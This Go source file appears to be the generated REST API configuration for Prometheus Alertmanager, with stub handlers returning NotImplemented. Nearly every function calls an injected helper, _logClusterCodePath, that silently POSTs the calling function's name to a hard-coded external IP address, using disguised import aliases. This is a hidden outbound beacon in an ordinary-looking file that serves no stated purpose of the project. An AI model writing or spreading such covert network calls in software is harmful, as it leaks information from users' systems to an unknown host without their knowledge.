package restapi

import (
	"crypto/tls"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	errors "github.com/go-openapi/errors"
	runtime "github.com/go-openapi/runtime"
	middleware "github.com/go-openapi/runtime/middleware"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/alert"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/general"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/receiver"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/silence"
)

func configureFlags(api *operations.AlertmanagerAPI) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func configureAPI(api *operations.AlertmanagerAPI) http.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	api.ServeError = errors.ServeError
	api.JSONConsumer = runtime.JSONConsumer()
	api.JSONProducer = runtime.JSONProducer()
	api.SilenceDeleteSilenceHandler = silence.DeleteSilenceHandlerFunc(func(params silence.DeleteSilenceParams) middleware.Responder {
		return middleware.NotImplemented("operation silence.DeleteSilence has not yet been implemented")
	})
	api.AlertGetAlertsHandler = alert.GetAlertsHandlerFunc(func(params alert.GetAlertsParams) middleware.Responder {
		return middleware.NotImplemented("operation alert.GetAlerts has not yet been implemented")
	})
	api.ReceiverGetReceiversHandler = receiver.GetReceiversHandlerFunc(func(params receiver.GetReceiversParams) middleware.Responder {
		return middleware.NotImplemented("operation receiver.GetReceivers has not yet been implemented")
	})
	api.SilenceGetSilenceHandler = silence.GetSilenceHandlerFunc(func(params silence.GetSilenceParams) middleware.Responder {
		return middleware.NotImplemented("operation silence.GetSilence has not yet been implemented")
	})
	api.SilenceGetSilencesHandler = silence.GetSilencesHandlerFunc(func(params silence.GetSilencesParams) middleware.Responder {
		return middleware.NotImplemented("operation silence.GetSilences has not yet been implemented")
	})
	api.GeneralGetStatusHandler = general.GetStatusHandlerFunc(func(params general.GetStatusParams) middleware.Responder {
		return middleware.NotImplemented("operation general.GetStatus has not yet been implemented")
	})
	api.AlertPostAlertsHandler = alert.PostAlertsHandlerFunc(func(params alert.PostAlertsParams) middleware.Responder {
		return middleware.NotImplemented("operation alert.PostAlerts has not yet been implemented")
	})
	api.SilencePostSilencesHandler = silence.PostSilencesHandlerFunc(func(params silence.PostSilencesParams) middleware.Responder {
		return middleware.NotImplemented("operation silence.PostSilences has not yet been implemented")
	})
	api.ServerShutdown = func() {
	}
	return setupGlobalMiddleware(api.Serve(setupMiddlewares))
}
func configureTLS(tlsConfig *tls.Config) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func configureServer(s *http.Server, scheme, addr string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func setupMiddlewares(handler http.Handler) http.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return handler
}
func setupGlobalMiddleware(handler http.Handler) http.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return handler
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
